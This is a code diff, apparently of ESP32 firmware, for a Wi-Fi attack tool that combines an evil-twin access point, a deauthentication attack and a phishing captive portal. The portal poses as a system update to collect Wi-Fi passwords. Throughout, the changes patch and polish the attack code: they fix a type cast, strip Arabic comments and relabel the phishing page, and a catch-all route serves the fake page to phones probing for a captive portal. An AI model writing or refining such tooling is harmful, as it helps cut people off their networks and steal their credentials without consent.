@@ -55,7 +55,7 @@ const char *dashboard_html =
 "</body></html>";
 
 // ==========================================
-// 2. Portal HTML (صفحة التصيد المقنعة)
+// 2. Portal HTML (صفحة التصيد المقنعة - تحديث النظام)
 // ==========================================
 const char *portal_html = 
 "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
@@ -149,9 +149,8 @@ static esp_err_t submit_password_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
-// دالة توجيه الجذر (تفرق بين لوحة التحكم وصفحة التصيد)
+// دالة توجيه الجذر
 static esp_err_t root_handler(httpd_req_t *req) {
-    // إذا كان المسار غير المسارات المعروفة (طلبات الأندرويد والآيفون) وكان الهجوم نشطاً
     if (strcmp(req->uri, "/") != 0 && strcmp(req->uri, "/scan") != 0 && 
         strcmp(req->uri, "/start_eviltwin") != 0 && strcmp(req->uri, "/start_deauth") != 0 && 
         strcmp(req->uri, "/stop") != 0 && strcmp(req->uri, "/submit_password") != 0 && 
@@ -169,7 +168,6 @@ static esp_err_t root_handler(httpd_req_t *req) {
         return index_handler(req);
     }
     
-    // أي مسار آخر، اعرض صفحة التصيد
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, portal_html, strlen(portal_html));
     return ESP_OK;
@@ -206,11 +204,14 @@ static esp_err_t start_eviltwin_handler(httpd_req_t *req) {
         httpd_query_key_value(buf, "channel", channel_str, sizeof(channel_str));
         target_info_t target;
         memset(&target, 0, sizeof(target));
-        strncpy(target.ssid, ssid, sizeof(target.ssid) - 1);
+        
+        // تم إصلاح هذا السطر بإضافة (char*)
+        strncpy((char*)target.ssid, ssid, sizeof(target.ssid) - 1);
+        
         target.channel = atoi(channel_str);
         sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target.bssid[0], &target.bssid[1], &target.bssid[2], &target.bssid[3], &target.bssid[4], &target.bssid[5]);
         evil_twin_start_attack(&target);
-        is_attack_active = true; // تفعيل وضع الهجوم
+        is_attack_active = true;
         httpd_resp_send(req, "<h1 style='color:red;'>Evil Twin Started!</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
         return ESP_OK;
     }
@@ -236,7 +237,7 @@ static esp_err_t start_deauth_handler(httpd_req_t *req) {
 static esp_err_t stop_handler(httpd_req_t *req) {
     evil_twin_stop_attack();
     deauther_stop();
-    is_attack_active = false; // إيقاف وضع الهجوم
+    is_attack_active = false;
     httpd_resp_send(req, "<h1 style='color:green;'>All Attacks Stopped.</h1><a href='/'>Back</a>", HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -257,7 +258,7 @@ void http_server_start(void) {
         {.uri = "/start_eviltwin", .method = HTTP_GET, .handler = start_eviltwin_handler},
         {.uri = "/start_deauth", .method = HTTP_GET, .handler = start_deauth_handler},
         {.uri = "/stop", .method = HTTP_GET, .handler = stop_handler},
-        {.uri = "/*", .method = HTTP_GET, .handler = root_handler} // لاعتراض طلبات الأندرويد والآيفون
+        {.uri = "/*", .method = HTTP_GET, .handler = root_handler}
     };
 
     if (httpd_start(&server, &config) == ESP_OK) {
